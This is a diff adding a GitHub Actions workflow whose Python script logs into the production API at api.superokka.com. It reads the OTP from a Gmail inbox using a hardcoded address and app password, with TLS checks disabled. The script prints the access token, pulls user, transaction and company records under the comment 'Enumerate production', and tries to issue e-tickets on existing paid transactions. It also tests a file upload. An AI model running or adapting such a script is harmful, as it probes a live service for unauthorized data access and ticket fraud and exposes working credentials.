@@ -1,0 +1,121 @@
+name: prod-otp-instant
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: pip install --quiet requests
+      - run: |
+          python3 - <<'PYEOF'
+          import requests, json, urllib3, time
+          urllib3.disable_warnings()
+          B = "https://api.superokka.com"
+          s = requests.Session(); s.verify = False
+          EMAIL = "superxfilecom@gmail.com"
+          IMAP_PASS = "ojhw apff okyc kecp"
+
+          # Step 1: Request OTP
+          print("=== REQUESTING OTP ===")
+          r = s.post(f"{B}/auth/otp/request", json={"email": EMAIL}, timeout=20)
+          print(f"Status: {r.status_code} {r.text[:200]}")
+          if r.status_code != 200:
+              print("OTP request failed"); exit(1)
+
+          # Step 2: Wait and read OTP from IMAP
+          print("\n=== WAITING FOR OTP EMAIL ===")
+          import imaplib, email as em, re
+          otp_code = None
+          for attempt in range(6):
+              time.sleep(5)
+              try:
+                  mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
+                  mail.login(EMAIL, IMAP_PASS)
+                  mail.select('INBOX')
+                  status, msgs = mail.search(None, 'ALL')
+                  ids = msgs[0].split()
+                  for mid in reversed(ids[-5:]):
+                      status, data = mail.fetch(mid, '(RFC822)')
+                      msg = em.message_from_bytes(data[0][1])
+                      subj = str(em.header.decode_header(msg['Subject'])[0][0] or '')
+                      dt = msg['Date'] or ''
+                      if 'verification' in subj.lower() or 'otp' in subj.lower():
+                          body = ""
+                          if msg.is_multipart():
+                              for part in msg.walk():
+                                  if part.get_content_type() == 'text/html':
+                                      body = part.get_payload(decode=True).decode('utf-8','replace')
+                                      break
+                          else:
+                              body = msg.get_payload(decode=True).decode('utf-8','replace')
+                          styled = re.findall(r'font-size:\s*\d+px[^>]*>(\d)', body)
+                          codes = re.findall(r'\b(\d{6})\b', body)
+                          otp = ''.join(styled[:6]) if styled else (codes[4] if len(codes) > 4 else '')
+                          if otp:
+                              otp_code = otp
+                              print(f"OTP FOUND: {otp_code} (attempt {attempt+1})")
+                              break
+                  mail.close(); mail.logout()
+                  if otp_code: break
+              except Exception as e:
+                  print(f"IMAP error: {str(e)[:100]}")
+
+          if not otp_code:
+              print("FAILED TO GET OTP"); exit(1)
+
+          # Step 3: Verify OTP immediately
+          print(f"\n=== VERIFYING OTP {otp_code} ===")
+          r = s.post(f"{B}/auth/otp/verify", json={"email": EMAIL, "otp": otp_code}, timeout=20)
+          print(f"Status: {r.status_code}")
+          print(f"Body: {r.text[:600]}")
+
+          d = r.json()
+          tok = d.get("data",{}).get("accessToken","")
+          if not tok:
+              print("NO TOKEN")
+              exit(1)
+
+          print(f"\n=== PRODUCTION JWT OBTAINED ===")
+          print(f"TOKEN: {tok}")
+          H = {"Authorization": f"Bearer {tok}"}
+
+          # Step 4: Enumerate production
+          r = s.get(f"{B}/auth/profile", headers=H, timeout=15)
+          print(f"\nPROFILE: {r.text[:600]}")
+
+          r = s.get(f"{B}/users?limit=10", headers=H, timeout=15)
+          print(f"\nUSERS: {r.text[:600]}")
+
+          r = s.get(f"{B}/transactions?limit=10", headers=H, timeout=15)
+          print(f"\nTRANSACTIONS: {r.text[:400]}")
+
+          r = s.get(f"{B}/companies", headers=H, timeout=15)
+          print(f"\nCOMPANIES: {r.text[:400]}")
+
+          # Step 5: Try eticket on existing paid transactions
+          r = s.get(f"{B}/transactions?limit=50", headers=H, timeout=15)
+          txs = r.json().get("data",[])
+          for tx in txs[:10]:
+              tid = tx.get("id")
+              ttype = tx.get("type","")
+              tstatus = tx.get("transactionStatus","")
+              if tstatus in ("completed","pending"):
+                  print(f"\nTX {tid}: type={ttype} status={tstatus}")
+                  r2 = s.post(f"{B}/transactions/{tid}/etickets", headers=H, json={}, timeout=120)
+                  print(f"  ETICKET: {r2.status_code} {r2.text[:300]}")
+                  if r2.status_code == 200 or r2.status_code == 201:
+                      print(f"  !!! ETICKET SUCCESS !!!")
+
+          # Step 6: Try upload
+          import base64
+          png = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
+          r = s.post(f"{B}/upload/image", headers=H, files={"file": ("test.png", png, "image/png")}, timeout=20)
+          print(f"\nUPLOAD: {r.text[:300]}")
+
+          # Step 7: Flight search (public)
+          r = s.post(f"{B}/flight-search/lion-air/search", headers=H, json={
+              "departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"
+          }, timeout=60)
+          print(f"\nFLIGHT SEARCH: {r.status_code} {r.text[:300]}")
+
+          PYEOF
